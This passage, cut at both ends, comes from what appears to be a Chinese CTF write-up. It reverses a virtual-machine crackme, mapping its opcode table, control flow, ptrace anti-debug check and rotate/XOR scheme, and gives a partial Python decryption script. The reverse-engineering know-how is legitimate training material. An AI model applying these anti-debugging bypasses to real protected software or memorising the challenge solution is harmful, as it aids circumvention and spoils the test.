rgb(255, 115, 253);">0x24db</span>, <span style="color: rgb(255, 115, 253);">0x24db</span>, <span style="color: rgb(255, 115, 253);">0x1cd0</span>, <span style="color: rgb(255, 115, 253);">0x1a4c</span>, <span style="color: rgb(255, 115, 253);">0x340a</span>, <span style="color: rgb(255, 115, 253);">0x340a</span>, <span style="color: rgb(255, 115, 253);">0x5c94</span>, <span style="color: rgb(255, 115, 253);">0x42fc</span>], <span style="color: rgb(168, 255, 96);">"  --r0;"</span>),<br /><span style="color: rgb(255, 115, 253);">0x42fc</span>: ([<span style="color: rgb(255, 115, 253);">0x3058</span>, <span style="color: rgb(255, 115, 253);">0x7717</span>, <span style="color: rgb(255, 115, 253);">0x7095</span>, <span style="color: rgb(255, 115, 253);">0x7095</span>, <span style="color: rgb(255, 115, 253);">0x6a77</span>, <span style="color: rgb(255, 115, 253);">0x1cd0</span>, <span style="color: rgb(255, 115, 253);">0x3e48</span>, <span style="color: rgb(255, 115, 253);">0x5927</span>, <span style="color: rgb(255, 115, 253);">0x63d2</span>, <span style="color: rgb(255, 115, 253);">0x64d3</span>], <span style="color: rgb(168, 255, 96);">"  ++r0;"</span>),<br /><span style="color: rgb(255, 115, 253);">0x6233</span>: ([<span style="color: rgb(255, 115, 253);">0x340a</span>, <span style="color: rgb(255, 115, 253);">0x1cd0</span>, <span style="color: rgb(255, 115, 253);">0x6233</span>, <span style="color: rgb(255, 115, 253);">0x340a</span>, <span style="color: rgb(255, 115, 253);">0x6233</span>, <span style="color: rgb(255, 115, 253);">0x6233</span>, <span style="color: rgb(255, 115, 253);">0x1a4c</span>, <span style="color: rgb(255, 115, 253);">0x340a</span>, <span style="color: rgb(255, 115, 253);">0x340a</span>, <span style="color: rgb(255, 115, 253);">0x1a4c</span>], <span style="color: rgb(168, 255, 96);">"  --r0;"</span>),<br /><span style="color: rgb(255, 115, 253);">0x3cbc</span>: ([<span style="color: rgb(255, 115, 253);">0x7375</span>, <span style="color: rgb(255, 115, 253);">0x5754</span>, <span style="color: rgb(255, 115, 253);">0x464f</span>, <span style="color: rgb(255, 115, 253);">0x3bf0</span>, <span style="color: rgb(255, 115, 253);">0x1a4c</span>, <span style="color: rgb(255, 115, 253);">0x3cbc</span>, <span style="color: rgb(255, 115, 253);">0x241a</span>, <span style="color: rgb(255, 115, 253);">0x4a13</span>, <span style="color: rgb(255, 115, 253);">0x1470</span>, <span style="color: rgb(255, 115, 253);">0x55a9</span>], <span style="color: rgb(168, 255, 96);">"  --r0;"</span>),<br /><span style="color: rgb(255, 115, 253);">0x1470</span>: ([<span style="color: rgb(255, 115, 253);">0x5e5b</span>, <span style="color: rgb(255, 115, 253);">0x340a</span>, <span style="color: rgb(255, 115, 253);">0x3725</span>, <span style="color: rgb(255, 115, 253);">0x40cb</span>, <span style="color: rgb(255, 115, 253);">0x41aa</span>, <span style="color: rgb(255, 115, 253);">0x2771</span>, <span style="color: rgb(255, 115, 253);">0x3959</span>, <span style="color: rgb(255, 115, 253);">0x1a4c</span>, <span style="color: rgb(255, 115, 253);">0x5e5b</span>, <span style="color: rgb(255, 115, 253);">0x188f</span>], <span style="color: rgb(168, 255, 96);">"  --r0;"</span>),<br /><span style="color: rgb(255, 115, 253);">0x153a</span>: ([<span style="color: rgb(255, 115, 253);">0x3a4b</span>, <span style="color: rgb(255, 115, 253);">0x2f84</span>, <span style="color: rgb(255, 115, 253);">0x1b12</span>, <span style="color: rgb(255, 115, 253);">0x2337</span>, <span style="color: rgb(255, 115, 253);">0x52ed</span>, <span style="color: rgb(255, 115, 253);">0x209a</span>, <span style="color: rgb(255, 115, 253);">0x4d52</span>, <span style="color: rgb(255, 115, 253);">0x41aa</span>, <span style="color: rgb(255, 115, 253);">0x43c2</span>, <span style="color: rgb(255, 115, 253);">0x2182</span>], <span style="color: rgb(168, 255, 96);">"  array[r0] = 0;"</span>),<br /><span style="color: rgb(255, 115, 253);">0x3a4b</span>: ([<span style="color: rgb(255, 115, 253);">0x4c8c</span>, <span style="color: rgb(255, 115, 253);">0x6bc8</span>, <span style="color: rgb(255, 115, 253);">0x284a</span>, <span style="color: rgb(255, 115, 253);">0x26a4</span>, <span style="color: rgb(255, 115, 253);">0x24db</span>, <span style="color: rgb(255, 115, 253);">0x26a4</span>, <span style="color: rgb(255, 115, 253);">0x3f0e</span>, <span style="color: rgb(255, 115, 253);">0x4d52</span>, <span style="color: rgb(255, 115, 253);">0x6a77</span>, <span style="color: rgb(255, 115, 253);">0x2f84</span>], <span style="color: rgb(168, 255, 96);">"  ++r0;"</span>),<br /><span style="color: rgb(255, 115, 253);">0x4c8c</span>: ([<span style="color: rgb(255, 115, 253);">0x340a</span>, <span style="color: rgb(255, 115, 253);">0x3f0e</span>, <span style="color: rgb(255, 115, 253);">0x1ee8</span>, <span style="color: rgb(255, 115, 253);">0x1ee8</span>, <span style="color: rgb(255, 115, 253);">0x3a4b</span>, <span style="color: rgb(255, 115, 253);">0x4a13</span>, <span style="color: rgb(255, 115, 253);">0x2bdd</span>, <span style="color: rgb(255, 115, 253);">0x42fc</span>, <span style="color: rgb(255, 115, 253);">0x7541</span>, <span style="color: rgb(255, 115, 253);">0x41aa</span>], <span style="color: rgb(168, 255, 96);">"  ++r0;"</span>),<br /><span style="color: rgb(255, 115, 253);">0x2bdd</span>: ([<span style="color: rgb(255, 115, 253);">0x78f1</span>, <span style="color: rgb(255, 115, 253);">0x63d2</span>, <span style="color: rgb(255, 115, 253);">0x2a19</span>, <span style="color: rgb(255, 115, 253);">0x136e</span>, <span style="color: rgb(255, 115, 253);">0x284a</span>, <span style="color: rgb(255, 115, 253);">0x724c</span>, <span style="color: rgb(255, 115, 253);">0x5676</span>, <span style="color: rgb(255, 115, 253);">0x2261</span>, <span style="color: rgb(255, 115, 253);">0x2261</span>, <span style="color: rgb(255, 115, 253);">0x3058</span>], <span style="color: rgb(168, 255, 96);">"  --array[r0];"</span>),<br /><span style="color: rgb(255, 115, 253);">0x7541</span>: ([<span style="color: rgb(255, 115, 253);">0x16f8</span>, <span style="color: rgb(255, 115, 253);">0x62f3</span>, <span style="color: rgb(255, 115, 253);">0x2b07</span>, <span style="color: rgb(255, 115, 253);">0x2a19</span>, <span style="color: rgb(255, 115, 253);">0x6154</span>, <span style="color: rgb(255, 115, 253);">0x44aa</span>, <span style="color: rgb(255, 115, 253);">0x42fc</span>, <span style="color: rgb(255, 115, 253);">0x2cd4</span>, <span style="color: rgb(255, 115, 253);">0x16f8</span>, <span style="color: rgb(255, 115, 253);">0x51ff</span>], <span style="color: rgb(168, 255, 96);">"  ++r0;"</span>),<br /><span style="color: rgb(255, 115, 253);">0x4d52</span>: ([<span style="color: rgb(255, 115, 253);">0x7375</span>, <span style="color: rgb(255, 115, 253);">0x7095</span>, <span style="color: rgb(255, 115, 253);">0x51ff</span>, <span style="color: rgb(255, 115, 253);">0x2f84</span>, <span style="color: rgb(255, 115, 253);">0x5f5c</span>, <span style="color: rgb(255, 115, 253);">0x604e</span>, <span style="color: rgb(255, 115, 253);">0x25b1</span>, <span style="color: rgb(255, 115, 253);">0x64d3</span>, <span style="color: rgb(255, 115, 253);">0x3b11</span>, <span style="color: rgb(255, 115, 253);">0x7375</span>], <span style="color: rgb(168, 255, 96);">"  ++r1;"</span>),<br /><span style="color: rgb(255, 115, 253);">0x7809</span>: ([<span style="color: rgb(255, 115, 253);">0x5002</span>, <span style="color: rgb(255, 115, 253);">0x3959</span>, <span style="color: rgb(255, 115, 253);">0x4d52</span>, <span style="color: rgb(255, 115, 253);">0x241a</span>, <span style="color: rgb(255, 115, 253);">0x1e22</span>, <span style="color: rgb(255, 115, 253);">0x3cbc</span>, <span style="color: rgb(255, 115, 253);">0x1e22</span>, <span style="color: rgb(255, 115, 253);">0x7809</span>, <span style="color: rgb(255, 115, 253);">0x7809</span>, <span style="color: rgb(255, 115, 253);">0x5d6d</span>], <span style="color: rgb(168, 255, 96);">"  --r0;"</span>),<br /><span style="color: rgb(255, 115, 253);">0x5baf</span>: ([<span style="color: rgb(255, 115, 253);">0x3058</span>, <span style="color: rgb(255, 115, 253);">0x66a4</span>, <span style="color: rgb(255, 115, 253);">0x5754</span>, <span style="color: rgb(255, 115, 253);">0x604e</span>, <span style="color: rgb(255, 115, 253);">0x40cb</span>, <span style="color: rgb(255, 115, 253);">0x241a</span>, <span style="color: rgb(255, 115, 253);">0x196d</span>, <span style="color: rgb(255, 115, 253);">0x3959</span>, <span style="color: rgb(255, 115, 253);">0x5833</span>, <span style="color: rgb(255, 115, 253);">0x2425</span>], <span style="color: rgb(168, 255, 96);">"  array[r0] = *((_BYTE *)&amp;flag + (unsigned __int8)r1);"</span>),<br /><span style="color: rgb(255, 115, 253);">0x5833</span>: ([<span style="color: rgb(255, 115, 253);">0x5c94</span>, <span style="color: rgb(255, 115, 253);">0x43c2</span>, <span style="color: rgb(255, 115, 253);">0x7717</span>, <span style="color: rgb(255, 115, 253);">0x51ff</span>, <span style="color: rgb(255, 115, 253);">0x4f23</span>, <span style="color: rgb(255, 115, 253);">0x5f5c</span>, <span style="color: rgb(255, 115, 253);">0x2771</span>, <span style="color: rgb(255, 115, 253);">0x42fc</span>, <span style="color: rgb(255, 115, 253);">0x3959</span>, <span style="color: rgb(255, 115, 253);">0x7375</span>], <span style="color: rgb(168, 255, 96);">"  array[r0] = 0;"</span>),<br /><span style="color: rgb(255, 115, 253);">0x11c9</span>: ([<span style="color: rgb(255, 115, 253);">0x62f3</span>, <span style="color: rgb(255, 115, 253);">0x5aa9</span>, <span style="color: rgb(255, 115, 253);">0x2182</span>, <span style="color: rgb(255, 115, 253);">0x2cd4</span>, <span style="color: rgb(255, 115, 253);">0x6154</span>, <span style="color: rgb(255, 115, 253);">0x5f5c</span>, <span style="color: rgb(255, 115, 253);">0x4a13</span>, <span style="color: rgb(255, 115, 253);">0x241a</span>, <span style="color: rgb(255, 115, 253);">0x3d82</span>, <span style="color: rgb(255, 115, 253);">0x1fb5</span>], <span style="color: rgb(168, 255, 96);">"  ++array[r0];"</span>),<br /><span style="color: rgb(255, 115, 253);">0x5103</span>: ([<span style="color: rgb(255, 115, 253);">0x1a4c</span>, <span style="color: rgb(255, 115, 253);">0x1b12</span>, <span style="color: rgb(255, 115, 253);">0x5927</span>, <span style="color: rgb(255, 115, 253);">0x64d3</span>, <span style="color: rgb(255, 115, 253);">0x25b1</span>, <span style="color: rgb(255, 115, 253);">0x2771</span>, <span style="color: rgb(255, 115, 253);">0x5f5c</span>, <span style="color: rgb(255, 115, 253);">0x4a13</span>, <span style="color: rgb(255, 115, 253);">0x6233</span>, <span style="color: rgb(255, 115, 253);">0x5f5c</span>], <span style="color: rgb(168, 255, 96);">"  ++array[r0];"</span>),<br /><span style="color: rgb(255, 115, 253);">0x54ca</span>: ([<span style="color: rgb(255, 115, 253);">0x209a</span>, <span style="color: rgb(255, 115, 253);">0x1b12</span>, <span style="color: rgb(255, 115, 253);">0x724c</span>, <span style="color: rgb(255, 115, 253);">0x5baf</span>, <span style="color: rgb(255, 115, 253);">0x209a</span>, <span style="color: rgb(255, 115, 253);">0x5f5c</span>, <span style="color: rgb(255, 115, 253);">0x2bdd</span>, <span style="color: rgb(255, 115, 253);">0x3058</span>, <span style="color: rgb(255, 115, 253);">0x3058</span>, <span style="color: rgb(255, 115, 253);">0x3bf0</span>], <span style="color: rgb(168, 255, 96);">"  ++array[r0];"</span>),<br /><span style="color: rgb(255, 115, 253);">0x68a6</span>: ([<span style="color: rgb(255, 115, 253);">0x3565</span>, <span style="color: rgb(255, 115, 253);">0x209a</span>, <span style="color: rgb(255, 115, 253);">0x3308</span>, <span style="color: rgb(255, 115, 253);">0x42fc</span>, <span style="color: rgb(255, 115, 253);">0x6fb6</span>, <span style="color: rgb(255, 115, 253);">0x42fc</span>, <span style="color: rgb(255, 115, 253);">0x3725</span>, <span style="color: rgb(255, 115, 253);">0x3058</span>, <span style="color: rgb(255, 115, 253);">0x5aa9</span>, <span style="color: rgb(255, 115, 253);">0x1bf1</span>], <span style="color: rgb(168, 255, 96);">"  ++array[r0];"</span>),<br /><span style="color: rgb(255, 115, 253);">0x4b0f</span>: ([<span style="color: rgb(255, 115, 253);">0x2917</span>, <span style="color: rgb(255, 115, 253);">0x48fe</span>, <span style="color: rgb(255, 115, 253);">0x3137</span>, <span style="color: rgb(255, 115, 253);">0x5baf</span>, <span style="color: rgb(255, 115, 253);">0x2bdd</span>, <span style="color: rgb(255, 115, 253);">0x2425</span>, <span style="color: rgb(255, 115, 253);">0x62f3</span>, <span style="color: rgb(255, 115, 253);">0x2771</span>, <span style="color: rgb(255, 115, 253);">0x136e</span>, <span style="color: rgb(255, 115, 253);">0x5754</span>], <span style="color: rgb(168, 255, 96);">"  *((_BYTE *)&amp;flag + (unsigned __int8)r1) = ((int)*((unsigned __int8 *)&amp;flag + (unsigned __int8)r1) &gt;&gt; array[r0]) | (*((_BYTE *)&amp;flag + (unsigned __int8)r1) &lt;&lt; (8 - array[r0]));"</span>),<br /><span style="color: rgb(255, 115, 253);">0x3fd4</span>: ([<span style="color: rgb(255, 115, 253);">0x3bf0</span>, <span style="color: rgb(255, 115, 253);">0x4a13</span>, <span style="color: rgb(255, 115, 253);">0x209a</span>, <span style="color: rgb(255, 115, 253);">0x6a77</span>, <span style="color: rgb(255, 115, 253);">0x17be</span>, <span style="color: rgb(255, 115, 253);">0x1cd0</span>, <span style="color: rgb(255, 115, 253);">0x63d2</span>, <span style="color: rgb(255, 115, 253);">0x5002</span>, <span style="color: rgb(255, 115, 253);">0x63d2</span>, <span style="color: rgb(255, 115, 253);">0x64d3</span>], <span style="color: rgb(168, 255, 96);">"  ++array[r0];"</span>)<br />}</code></pre><p>虚拟机指令有下面几种</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(168, 255, 96);">"""array[r0] = 0array[r0] += 1array[r0] -= 1r0 += 1r0 -= 1r1 += 1r1 -= 1flag[r1] = (flag[r1] &gt;&gt; array[r0]) | (flag[r1] &lt;&lt; (8 - array[r0]))array[r0] = syscall(array[r0], array[r0+1], &amp;array[r0+2], array[r0+3])flag[r1] ^= array[r0]flag[r1] = array[r0]array[r0] = flag[r1]if (array[r0] &lt; 0) rand();<br />"""</span></code></pre><p>除了基本的数据处理外，使用syscall实现系统调用，还有if分支根据<code style="font-family: SFMono-Regular, Consolas, ;">array[r0]</code>决定是否跳过一个随机数，即控制执行流</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">pc = <span style="color: rgb(255, 115, 253);">0x717F</span><br />i = <span style="color: rgb(255, 115, 253);">0</span><br />skips = [<span style="color: rgb(255, 115, 253);">18</span>, <span style="color: rgb(255, 115, 253);">22</span>, <span style="color: rgb(255, 115, 253);">48</span>, <span style="color: rgb(255, 115, 253);">168</span>, <span style="color: rgb(255, 115, 253);">172</span>, <span style="color: rgb(255, 115, 253);">312</span>, <span style="color: rgb(255, 115, 253);">340</span>, <span style="color: rgb(255, 115, 253);">370</span>, <span style="color: rgb(255, 115, 253);">397</span>, <span style="color: rgb(255, 115, 253);">449</span>, <span style="color: rgb(255, 115, 253);">478</span>, <span style="color: rgb(255, 115, 253);">595</span>, <span style="color: rgb(255, 115, 253);">599</span>, <span style="color: rgb(255, 115, 253);">623</span>, <span style="color: rgb(255, 115, 253);">627</span>, <span style="color: rgb(255, 115, 253);">675</span>]<br /><span style="color: rgb(150, 203, 254);">while</span> (pc != <span style="color: rgb(255, 115, 253);">0x241A</span>):<br />    print(i, hex(pc), ops[pc][<span style="color: rgb(255, 115, 253);">1</span>])<br />    <span style="color: rgb(150, 203, 254);">if</span> (i <span style="color: rgb(150, 203, 254);">in</span> skips):<br />        i += <span style="color: rgb(255, 115, 253);">1</span>    r = rands[i]<br />    i += <span style="color: rgb(255, 115, 253);">1</span><br />    pc = ops[pc][<span style="color: rgb(255, 115, 253);">0</span>][r]</code></pre><p>根据跑出来的随机数解析一下控制流，类似于下面这种需要手动设置一下skip跳过一个随机数</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(168, 255, 96);">"""16 0x284a   array[r0] = 0;17 0x7717   --array[r0];18 0x3565   if ( (char)array[r0] &lt; 0 ) rand();<br />"""</span></code></pre><p>虚拟指令里面用<code style="font-family: SFMono-Regular, Consolas, ;">syscall(0)</code>输入1个字符，进行一些移位异或操作</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(168, 255, 96);">"""array[0] = 0array[1] = 0array[3] = 110    array[2] = getchar()flag[0] ^= array[2]flag[1] = array[2]array[2] = 3flag[1] = (flag[1] &gt;&gt; 3 | (flag[1] &lt;&lt; 5)flag[1] ^= 3<br />"""</span></code></pre><p>还有<code style="font-family: SFMono-Regular, Consolas, ;">syscall(101, 0, 0, 0)</code>，即<code style="font-family: SFMono-Regular, Consolas, ;">ptrace</code>反调试检测，需要注意在无调试的情况下，第一次调用ptrace返回值为0，if不跳过rand，但是后续继续调用ptrace会返回-1，if需要跳过rand</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(168, 255, 96);">"""array[4] = 101array[5] = 0array[6] = 0array[7] = 0array[8] = 0array[4] = syscall(101, 0, 0, 0) # ptrace反调试, 0<br />"""</span></code></pre><p>输入完12个字符后，最后还有一段异或操作，人肉解析一下，纯体力活</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(168, 255, 96);">"""array[0] = 0array[1] = 0array[3] = 110    array[2] = getchar()flag[0] ^= array[2]flag[1] = array[2]array[2] = 3flag[1] = (flag[1] &gt;&gt; 3 | (flag[1] &lt;&lt; 5)flag[1] ^= 3array[2] = 0array[3] = 0array[5] = 140      array[4] = getchar()flag[1] ^= array[4]flag[2] = array[4]array[4] = 101array[5] = 0array[6] = 0array[7] = 0array[8] = 0array[4] = syscall(101, 0, 0, 0) # ptrace反调试, 0array[4] = 5flag[2] = (flag[2] &gt;&gt; 5 | (flag[2] &lt;&lt; 3)array[4] = 0array[5] = 0array[7] = 1191     array[6] = getchar()    # array[4] = 1flag[2] ^= array[6]flag[3] = array[6]array[6] = 101array[7] = 0array[8] = 0array[9] = 0array[10] = 0array[6] = syscall(101, 0, 0, 0) # ptrace反调试, -1array[6] = 6flag[3] = (flag[3] &gt;&gt; 6 | (flag[3] &lt;&lt; 2)array[6] = 0array[7] = 0array[9] = 1332     array[8] = getchar()    # array[6] = 1flag[3] ^= array[8]falg[4] = array[8]array[8] = 7flag[4] = (flag[4] &gt;&gt; 7 | (flag[4] &lt;&lt; 1)flag[4] ^= 7array[8] = 0arry[9] = 0array[11] = 1362     array[10] = getchar()   # array[8] = 1flag[4] ^= array[10]flag[5] = array[10]array[10] = 4flag[5] = (flag[5] &gt;&gt; 4 | (flag[5] &lt;&lt; 4)flag[5] ^= 4array[10] = 0array[11] = 0array[13] = 1389     array[12] = getchar()   # array[10] = 1flag[5] ^= array[12]flag[6] = array[12]array[12] = 4flag[6] = (flag[6] &gt;&gt; 4 | (flag[6] &lt;&lt; 4)array[12] = 0array[13] = 0array[15] = 1415     array[14] = getchar()   # array[12] = 1flag[6] ^= array[14]flag[7] = array[14]array[14] = 7flag[7] = (flag[7] &gt;&gt; 7 | (flag[7] &lt;&lt; 1)flag[7] ^= 7array[14] = 0array[15] = 0array[17] = 1441     array[16] = getchar()   # array[14] = 1flag[7] ^= array[16]flag[8] = array[16]array[16] = 7flag[8] = (flag[8] &gt;&gt; 7 | (flag[8] &lt;&lt; 1)array[16] = 0array[17] = 0array[19] = 1470    array[18] = getchar()   # array[16] = 1flag[8] ^= array[18]flag[9] = array[18]flag[9] = (flag[9] &gt;&gt; 2 | (flag[9] &lt;&lt; 6)615     c = getchar()flag[9] ^= cflag[10] = cflag[10] = (flag[10] &gt;&gt; 4) | (flag[10] &lt;&lt; 4)645     c = getchar()flag[10] ^= cflag[11] = cflag[11] = (flag[11] &gt;&gt; 4) | (flag[11] &lt;&lt; 4)667     c = getchar()flag[11] ^= cflag[12] = cflag[12] = (flag[12] &gt;&gt; 7) | (flag[12] &lt;&lt; 1)flag[12] ^= 7flag[2] ^= flag[1]...flag[12] ^= flag[11]<br />"""</span></code></pre><p>逆一下加密算法</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">flag = [<span style="color: rgb(255, 115, 253);">0</span>, <span style="color: rgb(255, 115, 253);">0x9D</span>, <span style="color: rgb(255, 115, 253);">0x6B</span>, <span style="color: rgb(255, 115, 253);">0xA1</span>, <span style="color: rgb(255, 115, 253);">0x02</span>, <span style="color: rgb(255, 115, 253);">0xD7</span>, <span style="color: rgb(255, 115, 253);">0xED</span>, <span style="color: rgb(255, 115, 253);">0x40</span>, <span style="color: rgb(255, 115, 253);">0xF6</span>, <span style="color: rgb(255, 115, 253);">0x0E</span>, <span style="color: rgb(255, 115, 253);">0xAE</span>, <span style="color: rgb(255, 115, 253);">0x84</span>, <span style="color: rgb(255, 115, 253);">0x19</span>]<br /><span style="color: rgb(150, 203, 254);">for</span> i <span style="color: rgb(150, 203, 254);">in</span> range(<span style="color: rgb(255, 115, 253);">12</span>, <span style="color: rgb(255, 115, 253);">1</span>, -<span style="color: rgb(255, 115, 253);">1</span>):<br />    flag[i] ^= flag[i-<span style="color: rgb(255, 115, 253);">1</span>]<br />flag[<span style="color: rgb(255, 115, 253);">12</span>] ^= <span style="color: rgb(255, 115, 253);">7</span><br />flag[<span style="color: rgb(255, 115, 253);">12</span>] = (flag[<span style="color: rgb(255, 115, 253);">12</span>] &lt;&lt; <span style="color: rgb(255, 115, 253);">7</span>) | (flag[<span style="color: rgb(255, 115, 253);">12</span>] &gt;&gt; <span style="color: rgb(255, 115, 253);">1</span>)<br />flag[<span style="color: rgb(255, 115, 253);">12</span>] &amp;= <span style="color: rgb(255, 115, 253);">0xFF</span><br />flag[<span style="color: rgb(255, 115, 253);">11</span>] ^= flag[<span style="color: rgb(255, 115, 253);">12</span>]<br />flag[<span style="color: rgb(255, 115, 253);">11</span>] = (flag[<span style="color: rgb(255, 115, 253);">11</span>] &lt;&lt; <span style="color: rgb(255, 115, 253);">4</span>) | (flag[<span style="color: rgb(255, 115, 253);">11</span>] &gt;&gt; <span style="color: rgb(255, 115, 253);">4</span>)<br />flag[<span style="color: rgb(255, 115, 253);">11</span>] &amp;= <span style="color: rgb(255, 115, 253);">0xFF</span><br />flag[<span style="color: rgb(255, 115, 253);">10</span>] ^= flag[<span style="color: rgb(255, 115, 253);">11</span>]<br />flag[<span style="color: rgb(255, 115, 253);">10</span>] = (flag[<span style="color: rgb(255, 115, 253);">10</span>] &lt;&lt; <span style="color: rgb(255, 115, 253);">4</span>) | (flag[<span style="color: rgb(255, 115, 253);">10</span>] &gt;&gt; <span style="color: rgb(255, 115, 253);">4</span>)<br />flag[<span style="color: rgb(255, 115, 253);">10</span>] &amp;= <span style="color: rgb(255, 115, 253);">0xFF</span><br />flag[<span style="color: rgb(255, 115, 253);">9</span>] ^= flag[<span style="color: rgb(255, 115, 253);">10</span>]<br />flag[<span style="color: rgb(255, 115, 253);">9</span>] = (flag[<span style="color: rgb(255, 115, 253);">9</span>] &lt;&lt; <span style="color: rgb(255, 115, 253);">2</span>) | (flag[<span style="color: rgb(255, 115, 253);">9</span>] &gt;&gt; <span style="color: rgb(255, 115, 253);">6</span>)<br />flag[<span style="color: rgb(255, 115, 253);">9</span>] &amp;= <span style="color: rgb(255, 115, 253);">0xFF</span><br />flag[<span style="color: rgb(255, 115, 253);">8</span>] ^= flag[<span style="color: rgb(255, 115, 253);">9</span>]<br />flag[<span style="color: rgb(255, 115, 253);">8</span>] = (flag[<span style="color: rgb(255, 115, 253);">8</span>] &lt;&lt; <span style="color: rgb(255, 115, 253);">7</span>) | (flag[<span style="color: rgb(255, 115, 253);">8</span>] &gt;&gt; <span style="color: rgb(255, 115, 253);">1</span>)<br />flag[<span style="color: rgb(255, 115, 253);">8</span>] &amp;= <span style="color: rgb(255, 115, 253);">0xFF</span><br />flag[<span style="color: rgb(255, 115, 253);">7</span>] ^= flag[<span style="color: rgb(255, 115, 253);">8</span>]<br />flag[<span style="color: rgb(255, 115, 253);">7</span>] ^= <span style="color: rgb(255, 115, 253);">7</span><br />flag[<span style="color: rgb(255, 115, 253);">7</span>] = (flag[<span style="color: rgb(255, 115, 253);">7</span>] &lt;&lt; <span style="color: rgb(255, 115, 253);">7</span>) | (flag[<span style="color: rgb(255, 115, 253);">7</span>] &gt;&gt; <span style="color: rgb(255, 115, 253);">1</span>)<br />flag[<span style="color: rgb(255, 115, 253);">7</span>] &amp;= <span style="color: rgb(255, 115, 253);">0xFF</span><br />flag[<span style="color: rgb(255, 115, 253);">6</span>] ^= flag[<span style="color: rgb(255, 115, 253);">7</span>]<br />flag[<span style="color: rgb(255, 115, 253);">6</span>] = (flag[<span style="color: rgb(255, 115, 253);">6</span>] &lt;&lt; <span style="color: rgb(255, 115, 253);">4</span>) | (flag[<span style="color: rgb(255, 115, 253);">6</span>] &gt;&gt; <span style="color: rgb(255, 115, 253);">4</span>)<br />flag[<span style="color: rgb(255, 115, 253);">6</span>] &amp;= <span style="color: rgb(255, 115, 253);">0xFF</span><br />flag[<span style="color: rgb(255, 115, 253);">5</span>] ^= flag[<span style="color: rgb(255, 115, 253);">6</span>]<br />flag[<span style="color: rgb(255, 115, 253);">5</span>] ^= <span style="color: rgb(255, 115, 253);">4</span><br />flag[<span style="color: rgb(255, 115, 253);">5</span>] = (flag[<span style="color: rgb(255, 115, 253);">5</span>] &lt;&lt; <span style="color: rgb(255, 115, 253);">4</span>) | (flag[<span style="color: rgb(255, 115, 253);">5</span>] &gt;&gt; <span style="color: rgb(255, 115, 253);">4</span>)<br />flag[<span style="color: rgb(255, 115, 253);">5</span>] &amp;= <span style="color: rgb(255, 115, 253);">0xFF</span><br />flag[<span style="color: rgb(255, 115, 253);">4</span>] ^= flag[<span style="color: rgb(255, 115, 253);">5</span>]<br />flag[<span style="color: rgb(255, 115, 253);">4</span>] ^= <span style="color: rgb(255, 115, 253);">7</span><br />flag[<span style="color: rgb(255, 115, 253);">4</span>] = (flag[<span style="color: rgb(255, 115, 253);">4</span>] &lt;&lt; <span style="color: rgb(255, 115, 253);">7</span>) | (flag[<span style="color: rgb(255, 115, 253);">4</span>] &gt;&gt; <span style="color: rgb(255, 115, 253);">1</span>)<br />flag[<span style="color: rgb(255, 115, 253);">4</span>] &amp;= <span style="color: rgb(255, 115, 253);">0xFF</span><br />flag[<span style="color: rgb(255, 115, 253);">3</span>] ^= flag[<span style="color: rgb(255, 115, 253);">4</span>]<br />flag[<span style="color: rgb(255, 115, 253);">3</span>] = (flag[<span style="color: rgb(255, 115, 253);">3</span>] &lt;&lt; <span style="color: rgb(255, 115, 253);">6</span>) | (flag[<span style="color: 